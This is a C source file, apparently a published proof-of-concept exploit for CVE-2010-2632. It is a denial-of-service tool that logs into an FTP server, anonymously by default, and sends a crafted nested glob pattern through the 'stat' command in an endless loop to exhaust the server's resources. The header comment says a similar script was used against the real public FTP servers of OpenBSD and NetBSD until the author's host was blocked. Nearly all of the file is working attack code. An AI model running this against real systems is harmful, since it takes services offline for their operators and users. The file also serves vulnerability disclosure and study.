#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

/*
PoC for multiple vendors ftpd (libc/glob) resource exhaustion [CVE-2010-2632]

Affected Software (verified):
- OpenBSD 4.7
- NetBSD 5.0.2
- FreeBSD 7.3/8.1
- Oracle Sun Solaris 10

Affected Vendors (not verified):
- GNU Libc (glibc)
- Apple
- Microsoft
- HP
- more

Credit:
Maksymilian Arciemowicz
cxib I securityreason J com

Note:
With similar script in php writed (this same pattern), we have attacked OpenBSD/NetBSD servers with result:

- ftp.openbsd.org:
Connection refused

and in the end of attack

# telnet ftp.openbsd.org 21
Trying 129.128.5.191...
Connected to ftp.openbsd.org.
Escape character is '^]'.
421-  If you are seeing this message you have been blocked from using
421- this ftp server - most likely for mirroring content without paying
421- attention to what you were mirroring or where you should be mirroring
421- it from, or for excessive connection rates.
421- OpenBSD should *NOT* be mirrored from here, you should use
421- a second level mirror as described in http://www.openbsd.org/ftp.html
421

Connection closed by foreign host.
#

-ftp.netbsd.org:
no more access for anonymous =>
---
On 02.07.2010 20:29 CET, ftp.netbsd.org has return:
530 User ftp access denied, connection limit of 160 reached.
---

and in the end, deny for my host.

*/

int sendftp(int stream,char *what){
        if(-1==send(stream,what,strlen(what),0))
                printf("Can't send %s\n",what);
        else
                printf("send: %s\n",what);

        bzero(what,sizeof(what));
}

void readftp(int stream,int len){
        char readline[len];
        if(recv(stream,readline,len,0)<1)
                printf("Can't read from stream\n");
        else
                printf("recv: %s\n",readline);
}


int sendstat(host,port,login,pass,pattern)
        char *host,*port,*login,*pass,*pattern;
{
        char buffer[1024]; // send ftp command buffor
        int     sockfd,n,error;
        struct addrinfo hints;
	struct addrinfo *res, *res0;

        memset(&hints, 0, sizeof(hints));
        hints.ai_family = PF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        error = getaddrinfo(host,port,&hints,&res0);

        if (error){
                errorcon:
                printf("Can`t connect\n.exit");
                exit(1);
        }

        if((sockfd=socket(res0->ai_family,res0->ai_socktype, res0->ai_protocol))<0)     goto errorcon;
        if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;

        readftp(sockfd,1024);
        snprintf(buffer,1024,"USER %s\nPASS %s\n\n",login,pass);
        sendftp(sockfd,buffer);
        readftp(sockfd,1024);

        bzero(buffer,1024);
        snprintf(buffer,1024,"stat %s\n",pattern);
        sendftp(sockfd,buffer);
        freeaddrinfo(res0);
}

int main(int argc,char *argv[])
{
        char
 pattern[1024]="{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*cx"; // some servers support only 1024
        char *login,*pass;
        char logindef[]="anonymous",passdef[]="cve_2010_2632@127.0.0.1";

        printf("This is exploit for CVE-2010-2632 (libc/glob)\nby Maksymilian Arciemowicz\n\n");

        if(argc<3){
                printf("Use: ./exploit host port [username] [password]\nhost and port are requied\n");
                exit(1);
        }

        char *host=argv[1];
        char *port=argv[2];

        if(4<=argc) login=argv[3];
        else login=logindef;

        if(5<=argc) pass=argv[4];
        else pass=passdef;

        while(1){
                printf("----------------------------- next\n");
                sendstat(host,port,login,pass,pattern);
                sleep(3); // some delay to be sure
        }
        return 0; // never happen
}

